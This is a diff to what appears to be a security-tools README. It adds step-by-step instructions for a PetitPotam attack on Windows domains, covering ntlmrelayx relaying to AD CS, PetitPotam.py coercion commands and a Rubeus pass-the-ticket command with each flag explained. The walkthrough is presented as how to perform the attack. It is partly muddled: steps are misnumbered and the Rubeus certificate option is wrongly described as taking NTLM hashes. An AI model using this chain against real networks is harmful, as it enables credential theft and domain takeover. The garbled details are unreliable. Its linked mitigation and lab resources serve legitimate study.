@@ -542,7 +542,27 @@ pip install psutil <br />
 **Important Note: PetitPotam Hijacking Attack what is is and how to perform it!** <br />
 `Description:` <br />
 A PetitPotam hijacking attack is a type of security exploit that targets Windows systems, specifically leveraging the Microsoft EFSRPC (Encrypting File System Remote Protocol) to coerce a machine into authenticating to an attacker-controlled server. By sending specially crafted requests, an attacker can force a target to reveal its NTLM (NT LAN Manager) credentials, which can then be used to gain unauthorized access to sensitive resources. This attack is particularly concerning because it can be executed without prior access to the network, making it a stealthy vector for compromising systems and gaining elevated privileges. <br />
-`Execution Steps: To be continued` <br />
+`Execution Steps:` <br />
+1. Use the `certutil.exe` command to identify the certificate authority. <br />
+2. Use the `ntlmrelayx.py -t <URL of Certificate authority with web enrolment> -smb2support --adcs --template DomainController` command from the Impacket tool kit to set up HTTP/SMB configuration to capture credentials from the Domain Controller. <br />
+3c. Use the `python3 PetitPotam.py -d <CA name> -u <Username> -p <Password> <Listener-IP> <IP of DC>` command to force the authentification using the captured credentials through the MS-EFSRPC (Microsoft's Encrypting File System Remote Protocal) call. <br />
+3b.If the DC is vulnerable the attack can be launched without credentials using the `python3 PetitPotam.py <Attacker’s IP> <IP of DC>` PetitPotam command to recieve the certificate's NTLM (New Technology LAN Manager) hashes. <br />
+![image](https://github.com/user-attachments/assets/d6d124e3-fe65-468f-b757-2b5542d24c5f) <br />
+`Username: User ID: LM Hash: NTLM Hash:::` <br />
+4. Once you have obtained the NTLM hashes of the certificate, utilize password-cracking tools such as Rubeus, Hashcat, etc. `Example Rubeus command: Rubeus.exe asktgt /outfile.kirbi /dc:<DC-IP> /domain: domain name /user: <Domain username> /ptt /certificate: <NTLM hashes received from above command>` <br />
+Command Breakdown: <br />
+   a. Rubeus.exe: This is the executable file for the Rubeus tool, which allows for various Kerberos-related operations. <br />
+   b. asktgt: This is a command within Rubeus that requests a Ticket Granting Ticket (TGT) from the Kerberos Key Distribution Center (KDC). This is often done to gain access to a domain. <br />
+   c. /outfile.kirbi: This option specifies the output file where the obtained TGT will be saved. In this case, the file will be named outfile.kirbi. The .kirbi extension is commonly used for Kerberos tickets. <br />
+   d. /dc:<DC-IP>: This option specifies the IP address of the Domain Controller (DC) that will be queried for the TGT. Replace <DC-IP> with the actual IP address of the target DC. <br />
+   e. /domain: <domain name>: This specifies the domain for which you are requesting the TGT. You need to replace <domain name> with the actual name of the domain you want to access. <br />
+   f. /user: <Domain username>: This option indicates the username of the domain account for which the TGT is being requested. Replace <Domain username> with the actual username. <br />
+   g. /ptt: This flag stands for "Pass The Ticket." It indicates that if the TGT is successfully obtained, it should be loaded into the current session, allowing the user to authenticate without needing to re-enter credentials. <br />
+   h. /certificate: <NTLM hashes received from above command>: This option specifies NTLM hashes that might be used for authenticating or acquiring the TGT. The placeholder <NTLM hashes received from above command> should be replaced with actual NTLM hashes that were obtained previously, typically from another command or tool. <br />
+**For more information please visit the links below:** <br />
+`1. Summary of vulnerability with mitigation techniques: https://www.rapid7.com/blog/post/2021/08/03/petitpotam-novel-attack-chain-can-fully-compromise-windows-domains-running-ad-cs/ ` <br />
+`2. Another summary of the vulnerability with a guideline on how to setup a practice lab: https://medium.com/r3d-buck3t/domain-takeover-with-petitpotam-exploit-3900f89b38f7 ` <br />
+`3. Practical usage of NTLM Hashes pth-toolkit and Impacket Guide: https://blog.ropnop.com/practical-usage-of-ntlm-hashes/ ` <br />
 
 **The Following List gives a short description of all the scripts in this group:** <br />
 1. tasktactician.py - The script above is a process monitoring tool designed to run on both Windows and Linux platforms. It continuously tracks and logs information about newly created processes, including their command line, creation time, executable path, parent process ID, process ID, user, and privileges. The script allows users to input the target host's IP address and port, enabling remote monitoring of processes on a specified machine. Leveraging platform-specific APIs such as WMI for Windows and system commands like `ps` for Linux, the script provides a platform-agnostic solution for process monitoring. Additionally, it employs exception handling to ensure robustness and reliability in capturing process information. Overall, this versatile script offers a flexible and accessible means to monitor and analyze system activities across diverse computing environments. <br />
